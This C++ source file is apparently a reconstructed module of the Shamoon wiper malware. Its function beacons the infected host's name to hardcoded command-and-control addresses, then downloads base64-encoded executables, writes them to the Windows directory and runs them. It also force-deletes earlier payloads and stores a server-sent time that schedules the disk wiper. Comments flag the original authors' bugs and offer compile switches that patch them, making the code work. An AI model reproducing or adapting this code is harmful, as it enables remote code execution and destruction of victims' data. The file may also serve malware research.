// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "Core.h"

#ifndef __TEST_ENVIRONMENT__
WCHAR *g_C2_IP[GROUP_COUNT][IP_COUNT] = 
{
	{
		L"home",
		L"10.1.252.19"
	}
};
#else // __TEST_ENVIRONMENT__
WCHAR *g_C2_IP[GROUP_COUNT][IP_COUNT] = 
{
	{
		L"127.0.0.1:8000"
	}
};
#endif // __TEST_ENVIRONMENT__

DWORD g_C2_accessType[GROUP_COUNT] =
{
	INTERNET_OPEN_TYPE_DIRECT
};

LPCWSTR g_C2_proxy[GROUP_COUNT];
LPCWSTR g_C2_proxyBypass[GROUP_COUNT];

BOOL SendDatoToC2(const WCHAR *c_lpszC2Data)
{
	// Setup data
	const WCHAR *pMyData= c_lpszC2Data;
	BOOL bSendSuccess	= FALSE;

#ifdef _DEBUG
	printf("%s: Sending data to C&C...\n", __FUNCTION__);
	printf("%s: %S\n", __FUNCTION__, c_lpszC2Data);
#endif // _DEBUG
	
	for (int i = 0; i < GROUP_COUNT; i++)
	{
		// IP of the C2 server
		WCHAR **szC2C_IP = g_C2_IP[i];
	
		// Open Internet connection
		HINTERNET hInternet = InternetOpenW(HTTP_REQUEST_AGENT, g_C2_accessType[i], g_C2_proxy[i], g_C2_proxyBypass[i], 0);
		
		// Setup data
		HINTERNET hFile		= NULL;
		INT32 nNetworkC2	= 0;
		
		// Try to establish connection
		while(1)
		{
			if(szC2C_IP != NULL)
			{
				// Allocate the memory for the URL
				WCHAR *szURL = new WCHAR[2048];
				if(szURL != NULL)
				{
					// Create the URL
					_wprintf(szURL,
						HTTP_PAGE_REQUEST_FORMAT,
						*szC2C_IP,
						HTTP_PAGE_GET_LOCATION,
						HTTP_PAGE_PARAMETER_DATA,
						(pMyData ? pMyData : L""),
						HTTP_PAGE_PARAMETER_UID,
						g_szHostname,
						GetTickCount()
					);
					
#ifdef _DEBUG
					printf("REQ: %S", szURL);
#endif // GROUP_COUNT

					// Try to open connection with the server
					hFile = InternetOpenUrlW(hInternet, szURL, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE, 0);
					
					// Delete URL allocated memory
					delete [] szURL;
					
					// If the connection has been established break
					if(hFile != NULL)
						break;
				}
			}
			
			szC2C_IP++;
			nNetworkC2++;

			// Loop until all the hardcoded C2 has been tried
			if(nNetworkC2 >= IP_COUNT)
			{
				if(hFile == NULL)
					goto NEXT;
				
				break;
			}
		}
		
		// Setup data
		bSendSuccess			= TRUE;
		DWORD nBufferSize		= 0;
		DWORD nPageSize			= 0;
		char *szServerResponse	= NULL;
		char *pPageResponse		= new char[51200];
		
		// Clear pPageResponse
		memset(pPageResponse, 0, 51200);
		
		// Read the whole page in parts of 51200 bytes
		while(InternetReadFile(hFile, pPageResponse, 51200, &nPageSize))
		{
			// If the read size is 0 then the file has been copied
			if(nPageSize == 0)
				break;
			
			if(szServerResponse == NULL)
			{
				// Create a new array which contains the data of the page
				szServerResponse = new char[nPageSize];
				
				// Copy the data received from the server
				memcpy(szServerResponse, pPageResponse, nPageSize);
				
				// The size of the buffer is equal to the size read
				nBufferSize = nPageSize;
			}
			else
			{
				// Create a new buffer
				char *pTempBuffer = new char[nBufferSize + nPageSize];
				
				// Copy the data from the old buffer
				memcpy(pTempBuffer, szServerResponse, nBufferSize);
				
				// Copy the new data
				memcpy(&pTempBuffer[nBufferSize], pPageResponse, nPageSize);
				
				// Clear previous array
				delete [] szServerResponse;
				
				// Add the part size to the total size
				nBufferSize += nPageSize;
				
				// Copy the pointer of the temporary buffer
				szServerResponse = pTempBuffer;
			}
			
			// Clear the array
			memset(pPageResponse, 0, 51200);
		}
		
		// Clear internet handle
		InternetCloseHandle(hFile);
		InternetCloseHandle(hInternet);
		
		// Delete memory allocation
		delete [] pPageResponse;
		
		// Compute the answer
		if(szServerResponse != NULL && nBufferSize >= 1)
		{
			char *pEncodedData = NULL;
			char szFilePath[256];
			
			// C2 sent an executable to execute
			if(*szServerResponse == COMMAND_EXECUTE)
			{
				// Decoded size
				INT32 nBase64Size;
				
				// Decode encoded bytes
				pEncodedData = (char *)base64_decode(szServerResponse + 1, nBufferSize - 1, &nBase64Size);
				if(pEncodedData != NULL)
				{
					char szSysCmd[404];
					
					// Clear from the previous executables
					sprintf(szSysCmd, "del /f /a %s%s*.%s", g_szWinDirA, TEMP_FILE_PATH, "exe");
					system(szSysCmd);
					
					// Copy the data into a random file
					// NOTE: "%S%S%d.%s" -> "%S" should be "%s",
					//       this mistake make the virus unable to execute external files
#ifndef __NO_PATCH__
					sprintf(szFilePath, "%s%s%d.%s", g_szWinDirA, TEMP_FILE_PATH, GetTickCount(), "exe");
#else // __NO_PATCH__
					sprintf(szFilePath, "%S%S%d.%s", g_szWinDirA, TEMP_FILE_PATH, GetTickCount(), "exe");
#endif // __NO_PATCH__
					
					// Create the output stream
					std::ofstream sExecute(szFilePath);
					
					// Check if the stream is good
					if(sExecute.good())
					{
						// Write the file
						// NOTE: Another mistake has been made here,
						//       the size of the data is 'nBufferSize - 1' since the first
						//       byte was the mark of the command type
#ifndef __NO_PATCH__
						sExecute.write(pEncodedData, nBufferSize - 1);
#else // 
						sExecute.write(pEncodedData, nBufferSize);
#endif // __NO_PATCH__
						
						// Execute the file
						system(szFilePath);
					}
				}
			}
			else
			{
				// C2 sent a the content of the file-time which tell the virus when execute the wiper
				if(*szServerResponse == COMMAND_TIME)
				{
					sprintf(szFilePath, "%s%s", g_szWinDirA, TIME_FILE_PATH);
					
					// Create the output stream
					std::ofstream sTime(szFilePath);
					
					// Check if the stream is good
					if(sTime.good())
					{
						// Write the file
						sTime.write(szServerResponse + 1, nBufferSize - 1);
					}
				}
			}
			
			// Delete the memory used by the data sent by the server
			delete [] szServerResponse;
			
			// Delete the memory used by the decoded data
			if(pEncodedData != NULL)
				delete [] pEncodedData;
		}
NEXT:
		;
	}
	
	// If data has been passed, delete the memory used
	if(pMyData != NULL)
		delete [] pMyData;
	
	// Return the status of the request
	return bSendSuccess;
}